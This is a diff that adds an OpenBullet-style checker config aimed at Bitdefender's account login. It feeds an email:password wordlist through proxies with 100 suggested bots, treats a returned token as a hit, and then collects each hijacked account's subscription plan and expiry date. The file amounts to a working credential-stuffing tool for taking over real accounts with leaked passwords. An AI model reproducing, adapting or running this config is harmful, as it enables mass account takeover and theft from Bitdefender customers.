@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "bitdefender",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-05T05:16:21.1484513+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fakeboy",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.bitdefender.com/lv2/account?login=<USER>&pass=<PASS>&action=login&type=userpass&fp=web" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: my.bitdefender.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DNT: 1" 
+  HEADER "Referer: https://my.bitdefender.com/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ar;q=0.8" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"error\": \"wrong_login\"" 
+  KEYCHAIN Success OR 
+    KEY "\"token\": " 
+#token PARSE "<SOURCE>" LR " \"token\": \"" "\"," -> VAR "token" 
+REQUEST GET "https://my.bitdefender.com/lv2/get_computers_new?login=<USER>&token=<token>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "\"product_name\": \"" "\"" -> CAP "Plan" 
+#Expiredate PARSE "<SOURCE>" LR "\"expire\": " "," -> VAR "expiredate" 
+#Expiredate FUNCTION UnixTimeToDate "<expiredate>" -> CAP "expiredate" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"product_name\" : \"Bitdefender Antivirus Free Edition\"" 
+    KEY "\"expire\": 0," 
+    KEY "\"no_devices\": 0, " 
+    KEY "\"product_name\" : \"BitDefender Total Security 2012\"" 
+    KEY "\"product_name\": \"Bitdefender Total Security\"" 
+    KEY "\"product_name\": \"Bitdefender Total Security 2015\"" 
+    KEY "\"product_name\": \"Bitdefender Antivirus Plus 2015\"" 
+    KEY "\"product_name\": \"Bitdefender Family Pack 2015\"" 
+    KEY "\"product_name\": BitDefender Total Security 2012\"" 
+    KEY "\"product_name\": \"Bitdefender Internet Security 2015\"" 
